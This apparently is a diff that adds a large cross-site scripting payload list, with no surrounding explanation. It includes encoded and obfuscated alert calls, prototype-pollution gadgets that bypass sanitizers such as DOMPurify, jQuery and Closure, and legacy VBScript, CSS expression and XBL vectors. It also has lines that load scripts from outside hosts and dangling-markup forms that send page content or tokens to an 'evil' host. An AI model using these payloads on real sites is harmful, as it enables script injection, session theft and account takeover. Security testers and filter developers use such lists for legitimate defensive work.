+';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');//
+';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');//
+';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');//
+';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');//
+';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');//
+';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');//
+';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');//
+';window['\141\154\145\162\164']('\130\123\123');//
+';self['\141\154\145\162\164']('\130\123\123');//
+';this['\141\154\145\162\164']('\130\123\123');//
+';top['\141\154\145\162\164']('\130\123\123');//
+';parent['\141\154\145\162\164']('\130\123\123');//
+';frames['\141\154\145\162\164']('\130\123\123');//
+';globalThis['\141\154\145\162\164']('\130\123\123');//
+';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';window[/al/.source+/ert/.source](/XSS/.source);//
+';self[/al/.source+/ert/.source](/XSS/.source);//
+';this[/al/.source+/ert/.source](/XSS/.source);//
+';top[/al/.source+/ert/.source](/XSS/.source);//
+';parent[/al/.source+/ert/.source](/XSS/.source);//
+';frames[/al/.source+/ert/.source](/XSS/.source);//
+';globalThis[/al/.source+/ert/.source](/XSS/.source);//
+';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+<script>Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';</script>
+<script>Object.prototype.preventDefault='x';Object.prototype.handleObj='x';Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');</script>
+<script>Object.prototype.div=['1','<img src onerror=alert(1)>','1']</script><script>$('<div x="x"></div>')</script>
+<script>Object.prototype.url = ['data:,alert(1)//'];Object.prototype.dataType = 'script';</script><script>$.get('https://google.com/');$.post('https://google.com/');</script>
+<script>Object.prototype.src = ['data:,alert(1)//']</script><script>$.getScript('https://google.com/')</script>
+<script>Object.prototype.url = 'data:,alert(1)//'</script><script>$.getScript('https://google.com/')</script>
+<script>Object.prototype.srcdoc=['<script>alert(1)<\/script>']</script><div class="g-recaptcha" data-sitekey="your-site-key"/>
+<script>Object.prototype.hif = ['javascript:alert(document.domain)'];</script>
+<script>Object.prototype.attrs = {src:1};Object.prototype.src='https://portswigger-labs.net/xss/xss.js'</script>
+<script>Object.prototype.BOOMR = 1;Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>
+<script>Object.prototype.sourceURL = '\u2028\u2029alert(1)'</script><script>_.template('test')</script>
+<script>Object.prototype['*'] = ['onload']</script><script>document.write(sanitizeHtml('<iframe onload=alert(1)>'))</script>
+<script>Object.prototype.whiteList = {img: ['onerror', 'src']}</script><script>document.write(filterXSS('<img src onerror=alert(1)>'))</script>
+<script>Object.prototype.ALLOWED_ATTR = ['onerror', 'src']</script><script>document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))</script>
+<script>Object.prototype.documentMode = 9</script>
+<script>const html = '<img src onerror=alert(1)>';const sanitizer = new goog.html.sanitizer.HtmlSanitizer();const sanitized = sanitizer.sanitize(html);const node = goog.dom.safeHtmlToNode(sanitized);document.body.append(node);</script>
+<script>Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';</script>
+<script>Object.prototype.tagName = 'img'Object.prototype.src = ['x:x']Object.prototype.onerror = ['alert(1)']</script><script>(function() {var View = Mn.View.extend({template: '#template-layout'});var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});var app = new App();app.start();})();</script><div id="template-layout" type="x-template/underscore">xxx</div>
+<script>Object.prototype.src='data:,alert(1)//'</script>
+<script>Object.prototype.onload = 'alert(1)'</script>
+<script>Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']</script>
+<strong data-bind="text:'hello'"></strong><script>Object.prototype[4]="a':1,[alert(1)]:1,'b";Object.prototype[5]=',';</script><script>ko.applyBindings({})</script>
+<img src="javascript:alert(1)">
+<body background="javascript:alert(1)">
+<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">
+<a href="vbscript:MsgBox+1">XSS</a>
+<a href="#" onclick="vbs:Msgbox+1">XSS</a>
+<a href="#" onclick="VBS:Msgbox+1">XSS</a>
+<a href="#" onclick="vbscript:Msgbox+1">XSS</a>
+<a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a>
+<a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>
+<a href="#" onclick="jscript.compact:alert(1);">test</a>
+<a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>
+<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
+<a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
+<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<a title="&{alert(1)}">XSS</a>
+<link href="xss.js" rel=stylesheet type="text/javascript">
+<form><button name=x formaction=x><b>stealme
+<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>
+<div style="-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">
+<div style="\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">
+<div style="-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)">
+<div style="-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)">
+<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" />
+<div style=xss:expression(alert(1))>
+<div style=xss:expression(1)-alert(1)>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio\006e(alert(1))>
+<div style=xss:expressio\00006e(alert(1))>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio&#x5c;6e(alert(1))>
+<div style=xss=expression(alert(1))>
+<div style="color&#x3dred">test</div>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>
+<script>
+function window.onload(){
+alert(1);
+}
+</script>
+<script>
+function window::onload(){
+alert(1);
+}
+</script>
+<script>
+function window.location(){
+}
+</script>
+<body>
+<script>
+function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}
+</script>
+</body>
+<body>
+<script>
+function document.body.innerHTML(){ x = "<img src=1 onerror=alert(1)>"; }
+</script>
+</body>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>
+<a href="javascript&#x6a;avascript:alert(1)">Firefox</a>
+<a href="javascript&colon;alert(1)">Firefox</a>
+<!-- ><img title="--><iframe/onload=alert(1)>"> -->
+<!-- ><img title="--><iframe/onload=alert(1)>"> -->
+<svg><xss onload=alert(1)>
+<isindex type=image src="//evil?
+<isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?
+<isindex type=submit formaction=javascript:alert(1)>
+<isindex type=submit action=javascript:alert(1)>
+<svg><discard onbegin=alert(1)>
+<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>
+<img src=validimage.png onloadstart=alert(1)>
+<input type=image onloadend=alert(1) src=validimage.png>
